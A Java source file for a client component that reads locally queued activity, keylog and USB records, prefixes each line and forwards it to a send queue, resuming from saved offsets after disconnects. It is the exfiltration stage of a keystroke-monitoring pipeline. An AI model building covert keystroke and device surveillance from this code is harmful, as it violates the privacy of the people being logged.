package com.acs;

import java.io.*;
import java.nio.file.*;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.BlockingQueue;

/**
 * Reads from .pending files and pushes lines into sendQueue.
 *
 * Responsibilities:
 *   - Polls all pending files every 200ms
 *   - For each file: reads from saved offset, pushes to sendQueue with correct prefix
 *   - After each successful send: increments + saves offset
 *   - When all lines sent: truncates file + resets offset
 *   - pause() / resume() called by SimpleClient on disconnect / reconnect
 *   - On resume: just continues from saved offset — no special replay logic needed
 *
 * Type → prefix mapping:
 *   "activity" → "ACTIVITY:"
 *   "keylog"   → "KEYLOG:"
 *   "usb"      → "USB:"
 *   Adding new type: just add entry to PREFIXES map below.
 */
public class FileSender {

    // Ordered map — determines send order across types
    private static final Map<String, String> PREFIXES = new LinkedHashMap<>();
    static {
        PREFIXES.put("activity", "ACTIVITY:");
        PREFIXES.put("keylog",   "KEYLOG:");
        PREFIXES.put("usb",      "USB:");
    }

    private static final long POLL_INTERVAL_MS = 200;

    private final BlockingQueue<String> sendQueue;

    private volatile boolean running = false;
    private volatile boolean paused  = false;
    private Thread senderThread;

    // Lock for pause/resume signalling
    private final Object pauseLock = new Object();

    public FileSender(BlockingQueue<String> sendQueue) {
        this.sendQueue = sendQueue;
    }

    // ── Public API ────────────────────────────────────────────────────────────

    public void start() {
        running = true;
        paused  = false;

        senderThread = new Thread(() -> {
            System.out.println("[FileSender] Started");
            while (running) {
                // Block here while paused (disconnected)
                synchronized (pauseLock) {
                    while (paused && running) {
                        try { pauseLock.wait(); }
                        catch (InterruptedException e) { break; }
                    }
                }

                if (!running) break;

                try {
                    processAllFiles();
                    Thread.sleep(POLL_INTERVAL_MS);
                } catch (InterruptedException e) {
                    break;
                }
            }
            System.out.println("[FileSender] Stopped");
        }, "FileSender");
        senderThread.setDaemon(true);
        senderThread.start();
    }

    public void stop() {
        running = false;
        synchronized (pauseLock) { pauseLock.notifyAll(); }
        if (senderThread != null) senderThread.interrupt();
    }

    /**
     * Called by SimpleClient when connection drops.
     * FileSender stops pushing to queue — avoids filling queue with unsendable messages.
     */
    public void pause() {
        paused = true;
        System.out.println("[FileSender] Paused");
    }

    /**
     * Called by SimpleClient after successful reconnect.
     * FileSender resumes from saved offsets — picks up exactly where it left off.
     */
    public void resume() {
        synchronized (pauseLock) {
            paused = false;
            pauseLock.notifyAll();
        }
        System.out.println("[FileSender] Resumed — continuing from saved offsets");
    }

    public boolean isPaused() { return paused; }

    // ── Core logic ────────────────────────────────────────────────────────────

    private void processAllFiles() {
        for (Map.Entry<String, String> entry : PREFIXES.entrySet()) {
            if (!running || paused) break; // stop mid-loop if paused/stopped
            processFile(entry.getKey(), entry.getValue());
        }
    }

    private void processFile(String type, String prefix) {
        Path pendingFile = ClientLogger.pendingFile(type);
        if (!Files.exists(pendingFile)) return;

        long offset = ClientLogger.readOffset(type);
        long lineNum = 0;
        boolean anyUnsent = false;

        try (BufferedReader reader = new BufferedReader(
                new FileReader(pendingFile.toFile()))) {

            String line;
            while ((line = reader.readLine()) != null) {
                if (!running || paused) return; // abort if paused mid-file

                if (lineNum < offset) {
                    // Already sent — skip
                    lineNum++;
                    continue;
                }

                // Unsent line — push to queue
                boolean offered = sendQueue.offer(prefix + line);
                if (!offered) {
                    // Queue full (shouldn't happen with unbounded queue) — stop for now
                    System.err.println("[FileSender] Queue offer failed for [" + type + "] — will retry");
                    return;
                }

                lineNum++;
                offset = lineNum;
                ClientLogger.saveOffset(type, offset);
                anyUnsent = true;
            }

        } catch (IOException e) {
            System.err.println("[FileSender] Read error [" + type + "]: " + e.getMessage());
            return;
        }

        // If we sent everything and file is fully caught up — truncate
        if (!anyUnsent && offset > 0) {
            ClientLogger.truncate(type);
        } else if (anyUnsent && lineNum == offset) {
            // All lines in file have been sent — truncate
            ClientLogger.truncate(type);
        }
    }
}